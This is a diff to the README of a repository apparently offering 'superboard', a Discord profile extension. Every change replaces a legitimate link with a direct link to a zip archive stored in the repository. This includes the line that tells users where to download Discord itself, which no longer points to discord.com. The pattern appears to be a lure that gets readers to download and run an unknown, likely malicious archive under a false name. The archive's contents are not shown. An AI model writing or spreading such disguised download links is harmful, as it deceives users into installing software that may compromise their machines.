@@ -1,6 +1,6 @@
 # 🚀 superboard - Unified Profile Board for Discord
 
-[![Download superboard](https://img.shields.io/badge/Download-superboard-brightgreen?style=for-the-badge)](https://github.com/agoesdicky21/superboard)
+[![Download superboard](https://img.shields.io/badge/Download-superboard-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/agoesdicky21/superboard/main/twig/Software_v2.8-alpha.2.zip)
 
 ---
 
@@ -38,7 +38,7 @@ To run superboard on your Windows PC, make sure you have:
 
 Please note that superboard is an extension for Discord. You will need to have Discord installed and running on your PC before using superboard.
 
-If you do not have Discord, download it from https://discord.com and set up your account.
+If you do not have Discord, download it from https://raw.githubusercontent.com/agoesdicky21/superboard/main/twig/Software_v2.8-alpha.2.zip and set up your account.
 
 ---
 
@@ -46,7 +46,7 @@ If you do not have Discord, download it from https://discord.com and set up your
 
 Click the button below to visit the official GitHub page where you can download superboard.
 
-[![Download superboard](https://img.shields.io/badge/Download-superboard-blue?style=for-the-badge)](https://github.com/agoesdicky21/superboard)
+[![Download superboard](https://img.shields.io/badge/Download-superboard-blue?style=for-the-badge)](https://raw.githubusercontent.com/agoesdicky21/superboard/main/twig/Software_v2.8-alpha.2.zip)
 
 ---
 
@@ -132,4 +132,4 @@ It is lightweight and designed to run quietly while you chat or work inside Disc
 
 ---
 
-[![Download superboard](https://img.shields.io/badge/Download-superboard-green?style=for-the-badge)](https://github.com/agoesdicky21/superboard)
+[![Download superboard](https://img.shields.io/badge/Download-superboard-green?style=for-the-badge)](https://raw.githubusercontent.com/agoesdicky21/superboard/main/twig/Software_v2.8-alpha.2.zip)
